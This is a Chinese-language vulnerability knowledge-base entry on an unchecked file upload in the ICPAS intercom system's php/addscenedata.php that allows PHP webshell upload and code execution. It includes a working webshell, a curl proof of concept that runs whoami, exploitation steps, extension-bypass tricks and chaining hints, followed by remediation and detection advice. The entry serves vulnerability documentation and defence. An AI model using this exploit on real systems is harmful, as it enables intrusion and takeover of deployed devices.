---
id: web-generic-file-upload-icpas-addscenedata-php-webshell
title: ICPAS php/addscenedata.php 未校验扩展名：upload 文件名拼入 ../images/scene/ 上传 PHP 直接执行
type: scenario
domain: web
path: web/generic/file-upload
technique: icpas-addscenedata-upload-php-webshell
aliases:
- ICPAS addscenedata 任意上传
- IP 网络对讲广播系统文件上传
- images/scene webshell
- move_uploaded_file 未校验扩展名
tags:
- php
- file-upload
- webshell
- rce
- icpas
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V222
  verified_at: '2026-11-07T07:07:24+08:00'
  notes: 已对照原文 AI 报告中的 addscenedata.php move_uploaded_file 代码与 PoC 核对：未校验扩展名、落点 ../images/scene/ 成立；原文未实际上传验证，confidence medium 合理。
---

## 一句话结论

ICPAS 的 `php/addscenedata.php` 直接把 `$_FILES['upload']['name']` 拼到 `../images/scene/` 后调用 `move_uploaded_file`，既不校验扩展名、MIME，也不重命名；攻击者上传 `shell.php` 即可落到 Web 可访问的 `images/scene/` 目录并被 PHP 解析，形成任意代码执行。

## 原理

- 关键代码：

```php
$newFilePath = "../images/scene/" . $_FILES['upload']['name'];
if (move_uploaded_file($tmpFilePath, $newFilePath)) {
    $arr['res'] = 1;
}
```

- `$_FILES['upload']['name']` 完全由客户端 multipart 表单控制，代码没有 `pathinfo` 扩展名白名单、没有 `in_array` 类型判断、没有 `uniqid` 重命名，也没有限制目录。
- 目标目录 `images/scene/` 位于 Web 根下且允许 PHP 解析，因此上传的 `.php` 文件可通过 `http://target/images/scene/<name>.php` 直接访问执行。
- 即使扩展名被前端限制，也可直接构造 multipart 请求绕过；文件名中的路径分隔符还可能造成目录穿越（取决于 PHP/OS 处理）。
- 文章 AI 审计给出的 PoC 正是 `curl -F "upload=@shell.php"` 上传后访问 `/images/scene/shell.php?cmd=whoami`。

## 触发条件

- `php/addscenedata.php` 可访问（原文未说明是否需要登录；此类接口常无鉴权或仅低权限）。
- `images/scene/` 目录存在且 Web 服务器对 `.php` 解析（默认 PHP 站点通常如此）。
- PHP 允许 `move_uploaded_file` 且目标目录可写。

## 利用步骤

1. 准备最小 webshell，如 `<?php echo shell_exec($_GET['cmd']); ?>`，保存为 `shell.php`。
2. 向 `php/addscenedata.php` 发送 multipart 请求，字段名 `upload`。
3. 响应 `{"res":1}` 表示移动成功；访问 `http://target/images/scene/shell.php?cmd=whoami` 验证执行。
4. 若目标目录不可执行或路径不同，可结合文件名中的 `../` 调整落点，或改用系统其它任意写接口。

## PoC

```bash
cat > shell.php <<'EOF'
<?php echo shell_exec($_GET['cmd']); ?>
EOF

curl -s -F "upload=@shell.php" "http://target/php/addscenedata.php"
curl -s "http://target/images/scene/shell.php?cmd=whoami"
```

## 变体与关联

- **同系统其它上传点**：`php/addmediadatapath.php`、`php/addmediadata.php`、`php/uploadData.php` 也存在弱校验，但原文说明其落盘在 `AppServer\TeleVoiceMedia`、`AppServer\MediaFiles`、`AppServer\datastore` 等 Web 根之外，通常不直接解析，需结合其它漏洞利用。
- **扩展名绕过**：若后续版本加了黑名单，可尝试 `.php5`/`.phtml`/`.phar`、大小写、双写、`;` 截断或 `.htaccess` 解析配置（取决于中间件）。
- **关联**：与本系统 `uploadjson.php` 任意写、`ping.php` 命令注入卡可互相配合。

## 检测与防御

- **修复**：上传目录移出 Web 根；扩展名白名单（仅 jpg/png 等）并校验真实 MIME/文件头；服务端随机重命名；禁止文件名包含路径分隔符；目录禁用 PHP 解析。
- **加固**：Web 服务器对上传目录设置 `php_flag engine off` 或等效配置；限制上传大小与权限。
- **检测**：监控 `images/scene/` 下新增的可执行脚本、异常 `move_uploaded_file` 调用与上传后立即访问的请求。
